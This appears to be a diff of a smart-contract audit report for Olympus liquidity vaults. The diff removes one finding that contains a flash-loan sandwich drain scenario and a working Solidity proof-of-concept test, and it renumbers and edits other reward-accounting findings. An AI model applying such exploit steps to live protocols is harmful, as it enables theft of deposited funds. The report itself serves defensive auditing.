@@ -1,177 +1,9 @@
-# Issue H-1: Liquidity Vault can be drained 
-
-Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/213 
-
-## Found by 
-Bobface, immeas, Bahurum
-
-## Summary
-The SSLV can be drained. In short, an attacker can extract value from the SSLV free OHM liquidity by sandwiching its own withdrawals with appropriate swaps on the underlying balancer pool.
-
-## Vulnerability Detail
-The SSLV puts half of the liquidity of an user deposit as newly minted OHM tokens. An user can extract value from this free liquidity by pumping the spot price of OHM in the underlying before calling `withdraw()` and dumping the spot price afterwards. This way during withdrawal the SSLV receives more wstETH and less OHM than normal. The vault sees impermanent loss due to the swap, where the loss comes from the reduced amount of OHM received. However, the user does not share this loss since he never handles OHM and has a gain instead from the accrued amount of wstETH received.
-
-The amount of spot price manipulation possible is reduced by the `THRESHOLD` in the `_isPoolSafe()` check, so capital losses from the one iteration of the manipulation attack will be constrained and be at less than 2% capital used. However, an attacker can leverage flash loans to get a large amount of capital and make net losses large. Exact profitability of the attack depends on the Balancer Pool fees and if the pool has enough TVL to make net gains larger than gas fees. 
-
-A realistic scenario for the attack is as follow:
-- `THRESHOLD` = 2% 
-- Balancer pool fee = 0.3%
-- initial wstETH in pool = 100
-- initial OHM in pool = 17670
-- initial OHM pool price = oracle OHM price = 176.39 OHM for 1 wstETH
-- Attacker in the same tx:
-   1. Flashloan 918.82 wstETH from AAVE
-   2. Deposit 900 wsETH into SSLV
-   3. Swap 10 wstETH for 1741.2 OHM on balancer pool
-   4. Withdraw liquidity from SSLV: receive 909.00 wstETH
-   5. Swap 1741.2 OHM for 9.13 wstETH on balancer pool
-   6. Price in the balancer pool is now 209.1 OHM per 1 wstETH. Swap 8.146 wsETH for 1560.0 OHM to reset the pool price to the initial value
-   7. swap the 1560.0 OHM on the open market (not balancer) for around 1560.0/176.39 - fees = 8.82 wstETH
-   8. Attacker has 909.00 + 9.13 - 8.146 + 8.82 = 918,8 wstETH. Pay 0.09 % fee on flash loan = 918.134 * 0.0009 = 0.81 wstETH.
-   9.  Net gain after flashloan fee: 8 wstETH. He managed to extract the part of liquidity added by the SSLV (9 wstETH value minus all fees)
-   10. Since pool price is reset to the initial value, all the steps above can be repeated but with amount of tokens scaled respect to the new liquidity in the balancer pool. Pool can be drained by repeating many times
-
-## PoC
-The scenario above is tested in the following. `THRESHOLD` has been set to 2%.
-The values are all divided by 100 to stick with the 1 wstETH deposit already in the `setUp()`. Also exact values will change slighthly depending on chainlink prices at test execution.
-`LIMIT` is increased from 1000e9 to 10000e9.
-`FixedPointMathLib` is used instead of `FullMath` for convenience in arithmetic operations.
-Necessary interfaces for swaps have been added to `IBalancer.sol`
-
-```solidity
-function testDrainPool() public {
-
-        bytes memory userData;
-        uint256 wstEthAmount = 9 * 1e18;
-        uint256 wstEthAmountSwap = 9 * liquidityVault.THRESHOLD() * 1e18 / 2;
-        uint256 oraclePrice = liquidityVault._valueCollateral(1e18);
-
-        FundManagement memory funds = FundManagement(
-            {
-                sender: alice,
-                fromInternalBalance: false,
-                recipient: payable(alice),
-                toInternalBalance: false
-            }
-        );
-        SingleSwap memory singleSwap = SingleSwap(
-            {
-                poolId: liquidityPool.getPoolId(),
-                kind: SwapKind(0),
-                assetIn: address(wsteth),
-                assetOut: address(ohm),
-                amount: wstEthAmountSwap,
-                userData: userData
-            }
-        );
-
-        uint256 initialAlicewstEthBalance = wsteth.balanceOf(alice);
-        uint256 initialAliceOhmBalance = ohm.balanceOf(alice);
-
-        vm.startPrank(alice);
-
-        // 2. Deposit
-        liquidityVault.deposit(wstEthAmount, 0);
-        uint256 aliceLpPosition = liquidityVault.lpPositions(alice);
-        console2.log("2. wsETH deposited into SSLV:" , wstEthAmount);
-
-        // 3. Swap wstETH for OHM on balancer
-        wsteth.approve(address(vault), wstEthAmount);
-        uint256 ohmOut = vault.swap(singleSwap,
-                                    funds,
-                                    0,
-                                    block.timestamp + 1);
-        console2.log("3.Initial Pool price: ", oraclePrice);
-        console2.log("3.SWAP - wstETH in :", wstEthAmount);
-        console2.log("3.SWAP - OHM out :", ohmOut);
-
-        // 4. withdraw
-        uint256 wstETHfromWithdraw = liquidityVault.withdraw(aliceLpPosition, minTokenAmounts_, true);
-        console2.log("4. wstETH obtained from Withdrawal:", wstETHfromWithdraw);
-        
-        // 5. Swap OHM for wstETH on balancer
-        singleSwap.assetIn = address(ohm);
-        singleSwap.assetOut = address(wsteth);
-        singleSwap.amount = ohmOut;
-        ohm.approve(address(vault), ohmOut);
-        uint256 wstEthOut = vault.swap(singleSwap,
-                            funds,
-                            0,
-                            block.timestamp + 1);
-        console2.log("5. wsETH received from swap:", wstEthOut);
-        console2.log("5. OHM given in swap:", ohmOut);
-        
-        // 6. Swap wstETH for OHM on balancer to get to initial pool price
-        (, uint256[] memory balances_, ) = vault.getPoolTokens(
-            IBasePool(liquidityPool).getPoolId()
-        );
-        uint256 price = (balances_[0] * 1e18) / balances_[1];
-        uint256 priceRatio = price.divWadDown(oraclePrice);
-        singleSwap.assetIn = address(wsteth);
-        singleSwap.assetOut = address(ohm);
-        singleSwap.amount = balances_[1].mulWadDown(priceRatio.sqrt()*1e9 - 1e18);
-        uint256 ohmOutArbitrage = vault.swap(singleSwap,
-                                    funds,
-                                    0,
-                                    block.timestamp + 1);
-
-        (, balances_, ) = vault.getPoolTokens(
-            IBasePool(liquidityPool).getPoolId()
-        );
-        console2.log("6. Manipulated price: ", price);
-        price = (balances_[0] * 1e18) / balances_[1];
-        console2.log("6. wsETH swapped: ", singleSwap.amount);
-        console2.log("6. OHM received from swap:", ohmOutArbitrage);
-        console2.log("6. Corrected price: ", price);
-
-        // 7. swap the obtained OHM on the market for wstETH
-        // here bob is an exchange on the market
-        ohm.transfer(bob, ohmOutArbitrage); // send OHM to the exchange
-        vm.stopPrank();
-        vm.prank(bob);
-        uint256 wstethReceived = ohmOutArbitrage.divWadDown(oraclePrice)*997/1000;  // 0.3% assume fee on swap
-        wsteth.transfer(alice, wstethReceived);
-        console2.log("7. OHM swapped: ", ohmOutArbitrage);
-        console2.log("7. wstETh Received from swap: ", wstethReceived);
-        
-        console2.log("Initial OHM balance:", initialAliceOhmBalance);
-        console2.log("Final OHM balance:", ohm.balanceOf(alice));
-        int wsETHgain = int(wsteth.balanceOf(alice)) - int(initialAlicewstEthBalance);
-        if (wsETHgain > 0) {
-            console2.log("wstETH gain:", uint(wsETHgain));
-        } else {
-            console2.log("wstETH loss:", uint(-wsETHgain));
-        }
-    }
-```
-
-## Impact
-The impact depends on `THRESHOLD`, balancer pool fees, network congestion and TVL in the balancer pool. With current values, the attacker can easily drain a large part of the wstETH in the SSLV.
-
-## Code Snippet
-https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L217
-
-https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L280
-## Tool used
-
-Manual Review
-
-## Recommendation
-Some combinations of `THRESHOLD` and balancer pool fee make the attack always unprofitable.
-
-If balancer pool fee = 0.3%, then the attack is unprofitable for `THRESHOLD` < 1% in the scenario above (slight loss due to fees).
-
-Also, with `THRESHOLD` = 2%, an higher value appropriate for balancer pool fee should make this unprofitable.
-
-However, to be sure that this cannot be exploited, just add a withdrawal fee on the SSLV pool of half the `THRESHOLD` value.
-
-
-# Issue H-2: User can drain entire reward balance due to accounting issue in _claimInternalRewards and _claimExternalRewards 
+# Issue H-1: User can drain entire reward balance due to accounting issue in _claimInternalRewards and _claimExternalRewards 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/161 
 
 ## Found by 
-0xlmanini, carrot, nobody2018, GimelSec, ABA, Bauer, chaduke, Met, KingNFT, rvierdiiev, 0x52, Bahurum, Aymen0909
+Aymen0909, Bahurum, 0xlmanini, ABA, Met, carrot, chaduke, nobody2018, GimelSec, Bauer, KingNFT, cducrest-brainbot, 0x52, rvierdiiev
 
 ## Summary
 
@@ -214,12 +46,12 @@ Scale the `reward` amount by 1e18:
     -   userRewardDebts[msg.sender][rewardToken.token] += reward;
     +   userRewardDebts[msg.sender][rewardToken.token] += reward * 1e18;
 
-# Issue H-3: Adversary can economically exploit wstETHLiquidityVault 
+# Issue H-2: Adversary can economically exploit wstETHLiquidityVault 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/110 
 
 ## Found by 
-KingNFT, cducrest-brainbot, 0x52
+Bahurum, Bobface, KingNFT, cducrest-brainbot, 0x52, immeas
 
 ## Summary
 
@@ -317,167 +149,12 @@ I think the "Balances after adversary removes their liquidity" step might be wro
 
 
 
-# Issue H-4: claimFees may cause some external rewards to be locked in the contract 
-
-Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/100 
-
-## Found by 
-cccz
-
-## Summary
-claimFees will update rewardToken.lastBalance so that if there are unaccrued reward tokens in the contract, users will not be able to claim them.
-## Vulnerability Detail
-_accumulateExternalRewards takes the difference between the contract's reward token balance and lastBalance as the reward.
-and the accumulated reward tokens are updated by _updateExternalRewardState.
-```solidity
-    function _accumulateExternalRewards() internal override returns (uint256[] memory) {
-        uint256 numExternalRewards = externalRewardTokens.length;
-
-        auraPool.rewardsPool.getReward(address(this), true);
-
-        uint256[] memory rewards = new uint256[](numExternalRewards);
-        for (uint256 i; i < numExternalRewards; ) {
-            ExternalRewardToken storage rewardToken = externalRewardTokens[i];
-            uint256 newBalance = ERC20(rewardToken.token).balanceOf(address(this));
-
-            // This shouldn't happen but adding a sanity check in case
-            if (newBalance < rewardToken.lastBalance) {
-                emit LiquidityVault_ExternalAccumulationError(rewardToken.token);
-                continue;
-            }
-
-            rewards[i] = newBalance - rewardToken.lastBalance;
-            rewardToken.lastBalance = newBalance;
-
-            unchecked {
-                ++i;
-            }
-        }
-        return rewards;
-    }
-...
-    function _updateExternalRewardState(uint256 id_, uint256 amountAccumulated_) internal {
-        // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals
-        if (totalLP != 0)
-            externalRewardTokens[id_].accumulatedRewardsPerShare +=
-                (amountAccumulated_ * 1e18) /
-                totalLP;
-    }
-
-```
-auraPool.rewardsPool.getReward can be called by anyone to send the reward tokens to the contract
-```solidity
-    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){
-        uint256 reward = earned(_account);
-        if (reward > 0) {
-            rewards[_account] = 0;
-            rewardToken.safeTransfer(_account, reward);
-            IDeposit(operator).rewardClaimed(pid, _account, reward);
-            emit RewardPaid(_account, reward);
-        }
-
-        //also get rewards from linked rewards
-        if(_claimExtras){
-            for(uint i=0; i < extraRewards.length; i++){
-                IRewards(extraRewards[i]).getReward(_account);
-            }
-        }
-        return true;
-    }
-```
-However, in claimFees, the rewardToken.lastBalance will be updated to the current contract balance after the admin has claimed the fees.
-```solidity
-    function claimFees() external onlyRole("liquidityvault_admin") {
-        uint256 numInternalRewardTokens = internalRewardTokens.length;
-        uint256 numExternalRewardTokens = externalRewardTokens.length;
-
-        for (uint256 i; i < numInternalRewardTokens; ) {
-            address rewardToken = internalRewardTokens[i].token;
-            uint256 feeToSend = accumulatedFees[rewardToken];
-
-            accumulatedFees[rewardToken] = 0;
-
-            ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);
-
-            unchecked {
-                ++i;
-            }
-        }
-
-        for (uint256 i; i < numExternalRewardTokens; ) {
-            ExternalRewardToken storage rewardToken = externalRewardTokens[i];
-            uint256 feeToSend = accumulatedFees[rewardToken.token];
-
-            accumulatedFees[rewardToken.token] = 0;
-
-            ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);
-            rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));
-
-            unchecked {
-                ++i;
-            }
-        }
-    }
-```
-Consider the following scenario.
-1. Start with rewardToken.lastBalance = 200.
-2. After some time, the rewardToken in aura is increased by 100.
-3. Someone calls getReward to claim the reward tokens to the contract, and the 100 reward tokens increased have not yet been accumulated via _accumulateExternalRewards and _updateExternalRewardState.
-4. The admin calls claimFees to update rewardToken.lastBalance to 290(10 as fees).
-5. Users call claimRewards and receives 0 reward tokens. 90 reward tokens will be locked in the contract
-## Impact
-It will cause some external rewards to be locked in the contract
-## Code Snippet
-https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/WstethLiquidityVault.sol#L192-L216
-https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L496-L503
-https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L736-L766
-## Tool used
-
-Manual Review
-
-## Recommendation
-Use _accumulateExternalRewards and _updateExternalRewardState in claimFees to accrue rewards.
-```diff
-    function claimFees() external onlyRole("liquidityvault_admin") {
-        uint256 numInternalRewardTokens = internalRewardTokens.length;
-        uint256 numExternalRewardTokens = externalRewardTokens.length;
-
-        for (uint256 i; i < numInternalRewardTokens; ) {
-            address rewardToken = internalRewardTokens[i].token;
-            uint256 feeToSend = accumulatedFees[rewardToken];
-
-            accumulatedFees[rewardToken] = 0;
-
-            ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);
-
-            unchecked {
-                ++i;
-            }
-        }
-+       uint256[] memory accumulatedExternalRewards = _accumulateExternalRewards();
-        for (uint256 i; i < numExternalRewardTokens; ) {
-+           _updateExternalRewardState(i, accumulatedExternalRewards[i]);
-            ExternalRewardToken storage rewardToken = externalRewardTokens[i];
-            uint256 feeToSend = accumulatedFees[rewardToken.token];
-
-            accumulatedFees[rewardToken.token] = 0;
-
-            ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);
-            rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));
-
-            unchecked {
-                ++i;
-            }
-        }
-    }
-```
-
-# Issue H-5: cachedUserRewards variable is never reset, so user can steal all rewards 
+# Issue H-3: cachedUserRewards variable is never reset, so user can steal all rewards 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/43 
 
 ## Found by 
-Ruhum, ABA, saian, rvierdiiev, cducrest-brainbot, KingNFT, CRYP70, ast3ros, minhtrng, jonatascm
+CRYP70, ABA, ast3ros, nobody2018, minhtrng, saian, jonatascm, KingNFT, cducrest-brainbot, Ruhum, rvierdiiev
 
 ## Summary
 cachedUserRewards variable is never reset, so user can steal all rewards
@@ -521,12 +198,12 @@ This should be high severity
 
 
 
-# Issue H-6: User can receive more rewards through a mistake in the withdrawal logic 
+# Issue H-4: User can receive more rewards through a mistake in the withdrawal logic 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/13 
 
 ## Found by 
-ak1, jonatascm, carrot, joestakey, GimelSec, ABA, cccz, chaduke, rvierdiiev, psy4n0n, Dug, Ruhum, RaymondFam, usmannk, minhtrng, Bahurum
+joestakey, cccz, usmannk, Bahurum, Dug, ABA, psy4n0n, chaduke, carrot, minhtrng, jonatascm, GimelSec, ak1, RaymondFam, Ruhum, rvierdiiev
 
 ## Summary
 In the `withdraw()` function of the SingleSidedLiquidityVault the contract updates the reward state. Because of a mistake in the calculation, the user is assigned more rewards than they're supposed to.
@@ -721,7 +398,7 @@ Manual Review
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/187 
 
 ## Found by 
-ABA, mahdikarimi, xAlismx
+cccz, mahdikarimi, ABA, xAlismx, GimelSec, Ruhum
 
 ## Summary
 When a user claims some cached rewards it's possible that rewards be freezed for a while . 
@@ -745,7 +422,7 @@ add cached rewards to total rewards like the following line
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/177 
 
 ## Found by 
-hansfriese, cccz, cducrest-brainbot, 0x52
+cccz, cducrest-brainbot, 0x52, hansfriese
 
 ## Summary
 
@@ -781,85 +458,12 @@ ChatGPT
 
 Consider tracking accumulatedRewardsPerShare in a mapping rather than in the individual struct or change how removal of reward tokens works
 
-# Issue M-5: auraPool.booster.deposit boolean return value not handled in WstethLiquidityVault.sol 
-
-Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/135 
-
-## Found by 
-peanuts, ksk2345, tsvetanovv
-
-## Summary
-
-auraPool.booster.deposit boolean return value not handled in WstethLiquidityVault.sol
-
-## Vulnerability Detail
-
-The function _deposit() in WstethLiquidityVault.sol is called from deposit#SingleSidedLiquidityVault.sol, and its main aim is to get OHM-PAIR BPT LP tokens and stake the tokens into the aura pool.
-
-```solidity
-        JoinPoolRequest memory joinPoolRequest = JoinPoolRequest({
-            assets: assets,
-            maxAmountsIn: maxAmountsIn,
-            userData: abi.encode(1, maxAmountsIn, slippageParam_),
-            fromInternalBalance: false
-        });
-
-
-        // Join Balancer pool
-        ohm.approve(address(vault), ohmAmount_);
-        pairToken.approve(address(vault), pairAmount_);
-        vault.joinPool(pool.getPoolId(), address(this), address(this), joinPoolRequest);
-
-
-        // OHM-PAIR BPT after
-        uint256 lpAmountOut = pool.balanceOf(address(this)) - bptBefore;
-
-
-        // Stake into Aura
-        pool.approve(address(auraPool.booster), lpAmountOut);
-        auraPool.booster.deposit(auraPool.pid, lpAmountOut, true);
-```
-
-The deposit function in the Aura implementation returns a boolean to acknowledge that the deposit is successful.
-
-https://etherscan.io/address/0x7818A1DA7BD1E64c199029E86Ba244a9798eEE10#code#F34#L1
-
-```solidity
-function deposit(uint256 _pid, uint256 _amount, bool _stake) public returns(bool){
-```
-
-## Impact
-
-If the boolean value is not handled, the transaction may fail silently.
-
-## Code Snippet
-
-https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/WstethLiquidityVault.sol#L123-L140
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-
-Recommend checking for success return value 
-
-```solidity
--        auraPool.booster.deposit(auraPool.pid, lpAmountOut, true);
-+        bool success = auraPool.booster.deposit(auraPool.pid, lpAmountOut, true);
-+        require(success, 'stake failed')
-```
-
-like how this protocol does it:
-
-https://github.com/sherlock-audit/2022-12-notional/blob/55b3b0a451331e198fcb28714a0dbd6dabda38c1/contracts/vaults/balancer/internal/pool/TwoTokenPoolUtils.sol#L272-L273
-
-# Issue M-6: Internal reward tokens can and likely will over commit rewards 
+# Issue M-5: Internal reward tokens can and likely will over commit rewards 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/128 
 
 ## Found by 
-0xlmanini, 0x52, tives, minhtrng, Bahurum
+tives, Bahurum, 0xlmanini, minhtrng, 0x52
 
 ## Summary
 
@@ -887,12 +491,12 @@ ChatGPT
 
 I recommend adding an end timestamp to the accrual of internal tokens. Additionally, the amount of tokens needed to fund the internal tokens should be transferred from the caller (or otherwise tracked) when the token is added. 
 
-# Issue M-7: Removed reward tokens will no longer be claimable and will cause loss of funds to users who haven't claimed 
+# Issue M-6: Removed reward tokens will no longer be claimable and will cause loss of funds to users who haven't claimed 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/127 
 
 ## Found by 
-gerdusx, hansfriese, kiki\_dev, Cryptor, HonorLt, KingNFT, rvierdiiev, CRYP70, 0x52, Ruhum, Bauer
+Cryptor, CRYP70, kiki\_dev, Bauer, hansfriese, HonorLt, gerdusx, KingNFT, 0x52, Ruhum, rvierdiiev
 
 ## Summary
 
@@ -928,7 +532,7 @@ ChatGPT
 
 When a reward token is removed it should be moved into a "claim only" mode. In this state rewards will no longer accrue but all outstanding balances will still be claimable.
 
-# Issue M-8: `_accumulateExternalRewards()` could turn into an infinite loop if the check condition is true 
+# Issue M-7: `_accumulateExternalRewards()` could turn into an infinite loop if the check condition is true 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/125 
 
@@ -1025,12 +629,12 @@ Consider having the affected code logic refactored as follows:
 ```
 This will safely increment `i` when `continue` is hit and move on to the next `i + 1` iteration while still having SafeMath unchecked for the entire scope of the for loop.
 
-# Issue M-9: SingleSidedLiquidityVault.withdraw will decreases ohmMinted, which will make the calculation involving ohmMinted incorrect 
+# Issue M-8: SingleSidedLiquidityVault.withdraw will decreases ohmMinted, which will make the calculation involving ohmMinted incorrect 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/102 
 
 ## Found by 
-joestakey, cccz, Bobface, rvierdiiev, immeas, psy4n0n, jonatascm, favelanky
+joestakey, cccz, psy4n0n, Bobface, jonatascm, immeas, favelanky, rvierdiiev
 
 ## Summary
 SingleSidedLiquidityVault.withdraw will decreases ohmMinted, which will make the calculation involving ohmMinted incorrect.
@@ -1101,94 +705,252 @@ Manual Review
         ohmRemoved += ohmReceived > ohmMinted ? ohmReceived - ohmMinted : 0;
 ```
 
-# Issue M-10: SingleSidedLiquidityVault _canDeposit and getMaxDeposit are checking maximum amount in different ways 
+# Issue M-9: claimFees may cause some external rewards to be locked in the contract 
 
-Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/50 
+Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/100 
 
 ## Found by 
-hansfriese, cccz, ronnyx2017, rvierdiiev, cducrest-brainbot
+cccz
 
 ## Summary
-SingleSidedLiquidityVault _canDeposit and getMaxDeposit are checking maximum amount in different ways
+claimFees will update rewardToken.lastBalance so that if there are unaccrued reward tokens in the contract, users will not be able to claim them.
 ## Vulnerability Detail
-`_canDeposit` is used in order to check if user can deposit provided amount of ohm.
- https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L406-L409
+_accumulateExternalRewards takes the difference between the contract's reward token balance and lastBalance as the reward.
+and the accumulated reward tokens are updated by _updateExternalRewardState.
 ```solidity
-    function _canDeposit(uint256 amount_) internal view virtual returns (bool) {
-        if (amount_ + ohmMinted > LIMIT + ohmRemoved) revert LiquidityVault_LimitViolation();
+    function _accumulateExternalRewards() internal override returns (uint256[] memory) {
+        uint256 numExternalRewards = externalRewardTokens.length;
+
+        auraPool.rewardsPool.getReward(address(this), true);
+
+        uint256[] memory rewards = new uint256[](numExternalRewards);
+        for (uint256 i; i < numExternalRewards; ) {
+            ExternalRewardToken storage rewardToken = externalRewardTokens[i];
+            uint256 newBalance = ERC20(rewardToken.token).balanceOf(address(this));
+
+            // This shouldn't happen but adding a sanity check in case
+            if (newBalance < rewardToken.lastBalance) {
+                emit LiquidityVault_ExternalAccumulationError(rewardToken.token);
+                continue;
+            }
+
+            rewards[i] = newBalance - rewardToken.lastBalance;
+            rewardToken.lastBalance = newBalance;
+
+            unchecked {
+                ++i;
+            }
+        }
+        return rewards;
+    }
+...
+    function _updateExternalRewardState(uint256 id_, uint256 amountAccumulated_) internal {
+        // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals
+        if (totalLP != 0)
+            externalRewardTokens[id_].accumulatedRewardsPerShare +=
+                (amountAccumulated_ * 1e18) /
+                totalLP;
+    }
+
+```
+auraPool.rewardsPool.getReward can be called by anyone to send the reward tokens to the contract
+```solidity
+    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){
+        uint256 reward = earned(_account);
+        if (reward > 0) {
+            rewards[_account] = 0;
+            rewardToken.safeTransfer(_account, reward);
+            IDeposit(operator).rewardClaimed(pid, _account, reward);
+            emit RewardPaid(_account, reward);
+        }
+
+        //also get rewards from linked rewards
+        if(_claimExtras){
+            for(uint i=0; i < extraRewards.length; i++){
+                IRewards(extraRewards[i]).getReward(_account);
+            }
+        }
         return true;
     }
 ```
-As you can see user can deposit if his ohm amount + total ohmMinted is less than LIMIT + ohmRemoved.
-So max amount that is allowed here is `uint256 maxOhmAmount = LIMIT + ohmRemoved - ohmMinted`.
-
-Now let's check `getMaxDeposit` function.
-https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L318-L330
+However, in claimFees, the rewardToken.lastBalance will be updated to the current contract balance after the admin has claimed the fees.
 ```solidity
-    function getMaxDeposit() public view returns (uint256) {
-        uint256 currentPoolOhmShare = _getPoolOhmShare();
-        uint256 emitted;
+    function claimFees() external onlyRole("liquidityvault_admin") {
+        uint256 numInternalRewardTokens = internalRewardTokens.length;
+        uint256 numExternalRewardTokens = externalRewardTokens.length;
 
+        for (uint256 i; i < numInternalRewardTokens; ) {
+            address rewardToken = internalRewardTokens[i].token;
+            uint256 feeToSend = accumulatedFees[rewardToken];
 
-        // Calculate max OHM mintable amount
-        if (ohmMinted > currentPoolOhmShare) emitted = ohmMinted - currentPoolOhmShare;
-        uint256 maxOhmAmount = LIMIT + ohmRemoved - ohmMinted - emitted;
+            accumulatedFees[rewardToken] = 0;
 
+            ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);
 
-        // Convert max OHM mintable amount to pair token amount
-        uint256 ohmPerPairToken = _valueCollateral(1e18); // OHM per 1 pairToken
-        uint256 pairTokenDecimalAdjustment = 10**pairToken.decimals();
-        return (maxOhmAmount * pairTokenDecimalAdjustment) / ohmPerPairToken;
+            unchecked {
+                ++i;
+            }
+        }
+
+        for (uint256 i; i < numExternalRewardTokens; ) {
+            ExternalRewardToken storage rewardToken = externalRewardTokens[i];
+            uint256 feeToSend = accumulatedFees[rewardToken.token];
+
+            accumulatedFees[rewardToken.token] = 0;
+
+            ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);
+            rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));
+
+            unchecked {
+                ++i;
+            }
+        }
     }
 ```
-As you can see in this function `uint256 maxOhmAmount = LIMIT + ohmRemoved - ohmMinted - emitted`. And you can notice that is almost same formula as in `_canDeposit`, but we have additional param here `emitted`, which can decrease maximum amount.
-
-In case if `_canDeposit` function calculates incorrectly, then it allow users to deposit more, than protocol allows.
-In case if `getMaxDeposit` calculates incorrectly, which will be used by frontend and integration contracts, users and contracts that wants to integrate with protocol will receive wrong information about max deposit amount, and can have integration issues.
+Consider the following scenario.
+1. Start with rewardToken.lastBalance = 200.
+2. After some time, the rewardToken in aura is increased by 100.
+3. Someone calls getReward to claim the reward tokens to the contract, and the 100 reward tokens increased have not yet been accumulated via _accumulateExternalRewards and _updateExternalRewardState.
+4. The admin calls claimFees to update rewardToken.lastBalance to 290(10 as fees).
+5. Users call claimRewards and receives 0 reward tokens. 90 reward tokens will be locked in the contract
 ## Impact
-Max deposit amount is calculated in different ways.
+It will cause some external rewards to be locked in the contract
 ## Code Snippet
-Provided above
+https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/WstethLiquidityVault.sol#L192-L216
+https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L496-L503
+https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L736-L766
 ## Tool used
 
 Manual Review
 
 ## Recommendation
-You need to use same way in both functions.
+Use _accumulateExternalRewards and _updateExternalRewardState in claimFees to accrue rewards.
+```diff
+    function claimFees() external onlyRole("liquidityvault_admin") {
+        uint256 numInternalRewardTokens = internalRewardTokens.length;
+        uint256 numExternalRewardTokens = externalRewardTokens.length;
 
-# Issue M-11: WstethLiquidityVault.rescueFundsFromAura doesn't claim rewards 
+        for (uint256 i; i < numInternalRewardTokens; ) {
+            address rewardToken = internalRewardTokens[i].token;
+            uint256 feeToSend = accumulatedFees[rewardToken];
 
-Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/47 
+            accumulatedFees[rewardToken] = 0;
 
-## Found by 
-rvierdiiev
+            ERC20(rewardToken).safeTransfer(msg.sender, feeToSend);
 
-## Summary
-WstethLiquidityVault.rescueFundsFromAura doesn't claim rewards
-## Vulnerability Detail
-`WstethLiquidityVault.rescueFundsFromAura` function is designed to withdraw all funds from Aura. This is needed in order when smth happened to contract.
-Once funds are withdrawn, then `SingleSidedLiquidityVault.rescueToken` can be used in order to withdraw any token from contract.
+            unchecked {
+                ++i;
+            }
+        }
++       uint256[] memory accumulatedExternalRewards = _accumulateExternalRewards();
+        for (uint256 i; i < numExternalRewardTokens; ) {
++           _updateExternalRewardState(i, accumulatedExternalRewards[i]);
+            ExternalRewardToken storage rewardToken = externalRewardTokens[i];
+            uint256 feeToSend = accumulatedFees[rewardToken.token];
 
-The problem is that `WstethLiquidityVault.rescueFundsFromAura` [doesn't claim rewards](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/WstethLiquidityVault.sol#L361) as it provides `false` to withdrawAndUnwrap function.
+            accumulatedFees[rewardToken.token] = 0;
 
-Because of that contract losses some part of rewards from Aura.
-## Impact
-Contract losses some part of rewards from Aura, which can be claimed instead and withdrawn from contract.
-## Code Snippet
-Provided above
-## Tool used
+            ERC20(rewardToken.token).safeTransfer(msg.sender, feeToSend);
+            rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));
 
-Manual Review
+            unchecked {
+                ++i;
+            }
+        }
+    }
+```
 
-## Recommendation
-Use `auraPool.rewardsPool.withdrawAndUnwrap(auraBalance, true)`.
+## Discussion
 
-# Issue M-12: SingleSidedLiquidityVault._accumulateInternalRewards will revert with underflow error if rewardToken.lastRewardTime is bigger than current time 
+**IAm0x52**
+
+Escalate for 25 USDC.
+
+This should be medium for two reasons:
+
+1) Funds aren't actually lost because they can be rescued
+2) This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small
+
+**sherlock-admin**
+
+ > Escalate for 25 USDC.
+> 
+> This should be medium for two reasons:
+> 
+> 1) Funds aren't actually lost because they can be rescued
+> 2) This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small
+
+You've created a valid escalation for 25 USDC!
+
+To remove the escalation from consideration: Delete your comment.
+To change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**thereksfour**
+
